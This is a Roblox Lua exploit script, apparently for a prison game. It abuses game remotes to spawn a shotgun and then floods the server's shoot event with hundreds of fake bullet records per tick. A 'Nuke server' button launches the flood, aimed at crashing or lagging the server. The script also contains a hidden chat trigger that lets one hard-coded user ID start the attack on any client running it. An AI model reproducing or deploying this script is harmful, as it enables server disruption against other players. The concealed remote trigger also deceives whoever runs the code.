local ihatevar = false
local ihatevars = false
local function genrng(min, max)
    return min + math.random() * (max - min)
end
local function unfun()
    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    for _, item in pairs(backpack:GetChildren()) do
        if item.Name == "Remington 870" then
            print('okay theres a gun')
            return false
        end
    end
    return true
end
function givegun()
    local player = game.Players.LocalPlayer
    local remington870 = workspace.Prison_ITEMS:FindFirstChild("Remington 870", true)
    if remington870 then
        local remote = workspace:FindFirstChild("Remote")
        if remote then
            remote.ItemHandler:InvokeServer({
                Position = player.Character.Head.Position,
                Parent = remington870
            })
        else
            warn("Remote object not found")
        end
    else
        warn("Remington 870 object not found")
    end
end
local function fun()
    ihatevar = false
    ihatevars = false
    print('wtf player died or new game')
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    while unfun() do
        givegun()
        wait()
    end
    
    local Gun = "Remington 870"
    local Player = game.Players.LocalPlayer.Name
    
    game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Gun].ITEMPICKUP)
    
    for i,v in pairs(game.Players[Player].Backpack:GetChildren()) do
        if v.name == (Gun) then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end
    
    Gun = game.Players[Player].Character[Gun]
    local function FireGun(target)
        print('fire')
        ihatevars = true
        while ihatevars do
        coroutine.resume(coroutine.create(function()
            local bulletTable = {}
            local y = 256
            while y > 1 do
                table.insert(bulletTable, {
                    Hit = target,
                    Distance = 10000,
                    Cframe = CFrame.new(0,1,1),
                    RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
                })
                y -= 1
            end
            game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
        end))
        wait()
        end
    end
    local function runCoroutine(func)
        local co = coroutine.create(func)
        coroutine.resume(co)
    end
    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
    runCoroutine(FireGun)
end

local player = game.Players.LocalPlayer
local humanoid = player.Character:WaitForChild("Humanoid")

local function startfun()
    local function respawnListener()
        while true do
            while humanoid.Health > 0 do
                wait()
            end
            local player = game:GetService("Players").PlayerAdded:Wait()
            player.CharacterAdded:Connect(function()
                pcall(fun)  -- Call the function with pcall when the character is added
            end)
        end
    end

    coroutine.wrap(function()
        while true do
            local player = game:GetService("Players").LocalPlayer
            if player then
            	while humanoid.Health > 0 do
                	wait()
            	end
                player.CharacterAdded:Wait()
                pcall(fun)  -- Call the function with pcall when the character is added
            else
                game:GetService("Players").PlayerAdded:Wait()
            end
        end
    end)()
    fun()
    respawnListener()  -- Start the respawn listener
end

local player = game.Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = gui
local button = Instance.new("TextButton")
button.Parent = screenGui
button.Position = UDim2.new(0.05, 0, 0.9, 0)
button.Size = UDim2.new(0, 100, 0, 50)
button.Text = "Nuke server"
button.TextSize = 10
button.MouseButton1Click:Connect(startfun)
print('i think i fixed it')

for _, player in ipairs(game.Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        if player.UserId == 1422208527 and message == '$$cope^' then
            startfun()
        end
    end)
end

game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if player.UserId == 1422208527 and message == '$$cope^' then
            startfun()
        end
    end)
end)
